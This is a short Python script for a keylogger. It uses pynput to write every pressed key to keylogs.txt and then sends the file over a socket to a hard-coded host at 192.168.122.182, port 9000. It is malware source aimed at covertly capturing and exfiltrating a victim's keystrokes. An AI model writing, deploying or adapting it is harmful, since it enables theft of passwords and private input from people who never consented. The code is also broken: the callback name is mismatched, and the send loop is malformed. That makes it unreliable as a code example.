import pynput
from pynput.keyboard import Listener  # import necessary libraries to create keylogger program

import socket  # for file transmission over socket
import os
import threading  # Used as multiprocessing alternative in main function

with open("keylogs.txt", "w") as log_file:  # Create a new text file called "keylogs.txt" inside script directory
    log_file.write("")  # Empty the file before beginning to write logs

def onKey(event):  # Function that gets triggered whenever a key is pressed during keylogger operation
    with open("keylogs.txt", 'a+') as log_file:  # Open "keylogs.txt" in append mode/read-write if it exists, create it otherwise.
        log_file.write(str(event.char))  # Write the pressed key to txt file

if __name__ == '__main__':
    try:
        keyboard = Listener(on_press=OnKey)  # Create a keyboard listener object
        with keyboard:  # Start running the listener indefinitely - When program is interrupted, it won't stop working.
            keyboard.join()  # Join thread to continue with rest of program
    except Exception as e:
        print(f"Problem happened while capturing keystrokes", end="\n\n")

# Sending files over sockets
try:
    s = socket.socket()  # Create a socket object named 's' which would be used for sending/receiving the file
    host, port = socket.gethostbyname("192.168.122.182"), 9000  # Get host (IP) and port
    print(f"Connecting to server with IP address {host} and port number {port}", end="\n\n")

    s.connect((host, port))  # Connecting socket to the server
    file_inbyte = open("keylogs.txt", 'rb')  # Open file in binary read mode
    fsize = os.path.getsize('keylogs.txt') + 1
 
    bytesToEncode = bytearray()  # Declaration of empty byte array.

    byteList = [s.sendall(file_inbyte.readline()) for line in file_inbyte]
    for byteArray in byteList:
        bytesToEncode += bytearray(byteArray)

    print(f"Done. File sent", end="\n\n")
except socket.error as e:
    print("Socket Error: \r\n%s" % str(e))  # Print if any error while connecting to server
